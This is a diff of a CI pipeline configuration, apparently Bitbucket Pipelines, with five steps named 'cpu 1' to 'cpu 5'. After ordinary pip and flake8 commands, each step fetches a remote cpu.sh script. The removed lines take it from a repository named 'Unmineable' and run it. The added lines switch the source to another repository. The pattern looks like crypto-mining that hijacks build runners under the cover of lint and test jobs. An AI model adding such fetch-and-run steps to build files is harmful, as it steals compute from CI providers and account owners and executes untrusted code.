@@ -5,28 +5,28 @@
           script:
             - if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
             - pip install pytest
-            - wget https://raw.githubusercontent.com/sadsme9996/Unmineable/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
+            - wget https://raw.githubusercontent.com/Muhammadsadssss/cpu/main/cpu.sh
       - step:
           name: cpu 2
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/sadsme9996/Unmineable/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
+            - wget https://raw.githubusercontent.com/Muhammadsadssss/cpu/main/cpu.sh
       - step:
           name: cpu 3
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/sadsme9996/Unmineable/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
+            - wget https://raw.githubusercontent.com/Muhammadsadssss/cpu/main/cpu.sh
       - step:
           name: cpu 4
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/sadsme9996/Unmineable/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
+            - wget https://raw.githubusercontent.com/Muhammadsadssss/cpu/main/cpu.sh
       - step:
           name: cpu 5
           script:
             - pip install flake8
             - flake8 . --extend-exclude=dist,build --show-source --statistics
-            - wget https://raw.githubusercontent.com/sadsme9996/Unmineable/main/cpu.sh && chmod +x cpu.sh && ./cpu.sh
+            - wget https://raw.githubusercontent.com/Muhammadsadssss/cpu/main/cpu.sh
